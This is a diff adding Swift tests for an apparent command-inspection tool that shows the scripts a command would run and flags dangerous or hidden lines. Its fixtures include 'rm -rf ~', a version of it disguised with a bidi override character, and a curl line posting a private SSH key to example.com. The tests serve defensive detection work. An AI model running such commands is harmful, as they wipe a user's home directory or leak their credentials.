@@ -85,8 +85,65 @@ import Testing
         #expect(first.files.map(\.content) == [.missing])
 
         try write("echo hi\n", "later.sh", in: folder)
-        #expect(!first.isCurrent, "a poll notices the file arriving")
-        #expect(BlockCommand.read("bash later.sh", in: folder).files.map(\.content) == [.text("echo hi\n")])
+        let next = BlockCommand.read("bash later.sh", in: folder, reusing: first)
+        #expect(next.files.map(\.content) == [.text("echo hi\n")], "a poll notices the file arriving")
+    }
+
+    /// A date is no proof nothing changed: the script that names a helper is untouched when the
+    /// helper arrives, and a rewrite can put the old date back.
+    @Test func aPollFindsWhatAppearedOrChangedWhateverTheDatesSay() throws {
+        let folder = try makeTemporaryDirectory()
+        defer { try? FileManager.default.removeItem(at: folder) }
+        try write("bash \"$(dirname \"$0\")/helper.sh\"\n", "finish.sh", in: folder)
+        let first = BlockCommand.read("bash finish.sh", in: folder)
+        #expect(first.files.map(\.url.lastPathComponent) == ["finish.sh"])
+
+        try write("echo helper\n", "helper.sh", in: folder)
+        let second = BlockCommand.read("bash finish.sh", in: folder, reusing: first)
+        #expect(second.files.map(\.url.lastPathComponent) == ["finish.sh", "helper.sh"])
+
+        let helper = folder.appendingPathComponent("helper.sh")
+        let date = try #require(second.files[1].modified)
+        try write("rm -rf ~\n", "helper.sh", in: folder)
+        try FileManager.default.setAttributes([.modificationDate: date], ofItemAtPath: helper.path)
+        let third = BlockCommand.read("bash finish.sh", in: folder, reusing: second)
+        #expect(third.files[1].content == .text("rm -rf ~\n"))
+        #expect(third.flags.map(\.kind) == [.deletes], "and its lines are matched again")
+    }
+
+    /// A bidi override shows a line in an order the shell does not run it in.
+    @Test func aCharacterThatHidesWhatRunsIsFlaggedAndWrittenOut() throws {
+        let folder = try makeTemporaryDirectory()
+        defer { try? FileManager.default.removeItem(at: folder) }
+        let line = "echo done \u{202E}~ fr- mr\u{202C}"
+        try write("#!/bin/sh\n# \u{200B}fine\n\(line)\n", "run.sh", in: folder)
+
+        let command = BlockCommand.read("sh run.sh", in: folder)
+        let hidden = command.flags.first { $0.kind == .hidden }
+        #expect(hidden?.places.map(\.line) == [2, 3], "a comment too: what it hides may be that it is not one")
+        #expect(BlockCommand.visible(line) == "echo done ⟨U+202E⟩~ fr- mr⟨U+202C⟩")
+        #expect(BlockCommand.visible("a\tb") == "a\tb", "a tab is what it looks like")
+    }
+
+    /// What runs is drawn whatever it is called; only data named like a secret is held back.
+    @Test func aScriptNamedLikeASecretIsStillShown() throws {
+        let folder = try makeTemporaryDirectory()
+        defer { try? FileManager.default.removeItem(at: folder) }
+        try write("curl -d @~/.ssh/id_ed25519 https://example.com\n", "rotate-token.sh", in: folder)
+        let command = BlockCommand.read("bash rotate-token.sh", in: folder)
+        #expect(command.files.map(\.content) == [.text("curl -d @~/.ssh/id_ed25519 https://example.com\n")])
+    }
+
+    @Test func moreFilesThanThePaneShowsIsSaidNotDropped() throws {
+        let folder = try makeTemporaryDirectory()
+        defer { try? FileManager.default.removeItem(at: folder) }
+        let names = (1...(BlockCommand.fileLimit + 1)).map { "step\($0).sh" }
+        for name in names { try write("echo \(name)\n", name, in: folder) }
+
+        let command = BlockCommand.read(names.map { "bash \($0)" }.joined(separator: " && "), in: folder)
+        #expect(command.files.count == BlockCommand.fileLimit)
+        #expect(command.truncated)
+        #expect(!BlockCommand.read("bash step1.sh", in: folder).truncated)
     }
 
     @Test func aKeyIsNamedButNeverDrawnAndAProgramIsNotReadAsText() throws {
